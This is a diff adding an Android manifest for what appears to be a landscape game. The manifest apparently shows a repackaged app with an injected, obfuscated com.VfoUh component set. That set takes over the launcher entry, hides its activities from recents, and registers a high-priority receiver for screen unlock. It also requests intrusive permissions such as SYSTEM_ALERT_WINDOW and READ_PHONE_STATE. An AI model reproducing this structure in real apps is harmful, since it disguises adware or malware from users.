@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="ivc.bpsehin.obiwntop">
+    <application android:icon="@drawable/icon" android:label="@string/app_name" android:screenOrientation="sensor">
+        <activity android:configChanges="keyboardHidden|orientation" android:name="ivc.bpsehin.obiwntop.Survival" android:screenOrientation="landscape">
+            <intent-filter/>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="ivc.bpsehin.obiwntop.MainMenu" android:screenOrientation="landscape"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/title_help" android:name="Help" android:screenOrientation="landscape"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/title_stagelist" android:name="StageList" android:screenOrientation="landscape"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/title_stage" android:name="Stage" android:screenOrientation="landscape"/>
+        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14bdf8a577a65c"/>
+        <meta-data android:name="np_app_key" android:value="100514252"/>
+        <activity android:excludeFromRecents="true" android:name="com.VfoUh.ujQQLoKHkeFa">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:name="com.VfoUh.IQCLFEHFOSUMb"/>
+        <activity android:excludeFromRecents="true" android:name="com.VfoUh.nubFUsvB"/>
+        <service android:name="com.VfoUh.jcEFEUtvmEBl"/>
+        <service android:name="com.VfoUh.GHJklgGLsNQr"/>
+        <receiver android:name="com.VfoUh.CiBEpgWfr"/>
+        <receiver android:name="com.VfoUh.userPermissionReceiver">
+            <intent-filter android:priority="90000">
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+</manifest>
